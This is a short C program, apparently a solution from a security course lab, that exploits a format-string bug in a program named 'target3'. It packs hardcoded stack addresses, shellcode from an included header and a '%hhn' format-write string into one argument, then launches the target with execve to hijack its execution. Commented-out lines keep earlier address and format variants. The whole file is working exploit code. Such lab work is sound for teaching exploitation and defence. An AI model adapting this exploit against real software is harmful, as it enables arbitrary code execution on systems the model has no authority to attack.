#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "../targets/target3"

int main(void)
{
	char arg1[1000];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	char temp2[500]="%08x%55x%hhn%124x%hhn%259x%hhn%191x%hhn";
//	char temp2[500]="%8x%8x%10x%hn%10x%hn";
	char temp[500] = {0x54,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x55,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x56,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x57,0xfd,0xff,0xbe};	
//	char temp[500] = {0x71,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x72,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x73,0xfd,0xff,0xbe,0x41,0x41,0x41,0x41,0x74,0xfd,0xff,0xbe};
	strcat(temp,shellcode);	
	//memset(arg1, 0x41, 20);
	strcat(temp,temp2);
	strcpy(arg1, temp);
	printf("%s",arg1);

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
